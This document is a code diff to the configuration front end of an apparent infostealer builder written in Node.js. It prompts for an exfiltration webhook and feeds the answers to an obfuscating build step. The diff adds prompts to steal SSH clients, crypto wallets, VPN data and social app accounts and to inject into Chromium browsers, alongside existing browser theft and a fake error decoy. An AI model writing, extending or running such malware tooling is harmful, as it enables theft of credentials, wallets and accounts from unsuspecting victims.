@@ -3,7 +3,7 @@ const readline = require("readline");
 const gradient = require("gradient-string");
 const build = require("./obfu.js");
 const { spawnSync } = require("child_process");
-const path = require("path")
+const path = require("path");
 
 const rl = readline.createInterface({
   input: process.stdin,
@@ -66,19 +66,14 @@ async function completeConfiguration() {
   setTimeout(async () => {
     gf.stop();
 
-    const buildBatPath = path.join(
-      __dirname,
-      "script",
-      "install.bat"
-    );
+    const buildBatPath = path.join(__dirname, "script", "install.bat");
     const options = {
       cwd: path.join(__dirname, "script"),
-      stdio: "inherit", 
+      stdio: "inherit",
     };
 
     spawnSync(buildBatPath, [], options);
-    
-    
+
     console.clear();
     console.log(gradient.fruit(g));
     askQuestion("Enter your webhook: ", (answer) => {
@@ -108,18 +103,57 @@ async function completeConfiguration() {
                         let y = translateResponse(answer);
                         config["sysinfo"] = y;
                         askQuestion(
-                          "Do you want to steal browsers ? ",
+                          "Do you want to steal clients ssh ? ",
                           (answer) => {
                             let y = translateResponse(answer);
-                            config["browsers"] = y;
+                            config["clients"] = y;
                             askQuestion(
-                              "Do you want to open a fake error ? ",
-                              async (answer) => {
+                              "Do you want to steal browsers ? ",
+                              (answer) => {
                                 let y = translateResponse(answer);
-                                config["fakeerror"] = y;
-                                rl.close();
-                                console.clear();
-                                await build.main(config);
+                                config["browsers"] = y;
+                                askQuestion(
+                                  "Do you want to open a fake error ? ",
+                                  async (answer) => {
+                                    let y = translateResponse(answer);
+                                    config["fakeerror"] = y;
+                                    askQuestion(
+                                      "Do you want to steal crypto wallets ? ",
+                                      (answer) => {
+                                        let y = translateResponse(answer);
+                                        config["wallets"] = y;
+
+                                        askQuestion(
+                                          "Do you want to steal vpn ? ",
+                                          (answer) => {
+                                            let y = translateResponse(answer);
+                                            config["vpn"] = y;
+
+                                            askQuestion(
+                                              "Do you want to inject all chromium browsers ? ",
+                                              (answer) => {
+                                                let y =
+                                                  translateResponse(answer);
+                                                config["chromeinjection"] = y;
+                                                askQuestion(
+                                                  "Do you want to steal social app ? ",
+                                                  async (answer) => {
+                                                    let y =
+                                                      translateResponse(answer);
+                                                    config["social"] = y;
+                                                    rl.close();
+                                                    console.clear();
+                                                    await build.main(config);
+                                                  }
+                                                );
+                                              }
+                                            );
+                                          }
+                                        );
+                                      }
+                                    );
+                                  }
+                                );
                               }
                             );
                           }
